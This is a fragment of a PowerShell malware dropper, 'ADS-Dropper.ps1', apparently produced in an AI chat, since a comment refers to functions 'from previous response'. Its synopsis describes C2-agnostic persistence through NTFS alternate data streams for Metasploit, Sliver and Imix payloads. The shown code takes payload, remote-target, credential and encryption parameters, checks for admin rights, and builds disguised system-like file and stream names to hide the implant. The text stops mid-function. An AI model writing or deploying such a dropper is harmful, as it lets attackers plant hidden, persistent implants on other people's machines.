# `src/ADS-Dropper.ps1` (Complete Fixed v2)
<#
.SYNOPSIS
    ADS-Dropper: C2-Agnostic ADS Persistence (Imix/MSF/Sliver/CCDC)
#>

[CmdletBinding()] param(
    [Parameter(Mandatory)][object]$Payload,
    [string[]]$Targets = @('localhost'),
    [string[]]$Persist = @('task'),
    [switch]$Randomize, [switch]$Encrypt, [switch]$NoExec,
    [PSCredential]$Credential
)

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ',')"

# [All functions from previous response - Get-RandomADSConfig, ConvertTo-PSPayload, Protect-Payload, Unprotect-Payload, New-Loader, New-PSLoader, New-PersistenceMechanism, Invoke-RemoteDeployment]

#region Functions (Complete)
function Get-RandomADSConfig {
    $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
    $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
    $exts = @('.dat','.log','.idx','.tmp','.chk')
    $ntfsStreams = @('$EA','$OBJECT_ID','$SECURITY_DESCRIPTOR','$LOGGED_UTILITY_STREAM')
    
    @{ 
        HostPath = if($Randomize) { 
            (Resolve-Path ~).Path + '\' + ($adj|Get-Random) + ($noun|Get-Random) + ($exts|Get-Random)
        } else { 'C:\ProgramData\SystemCache.dat'
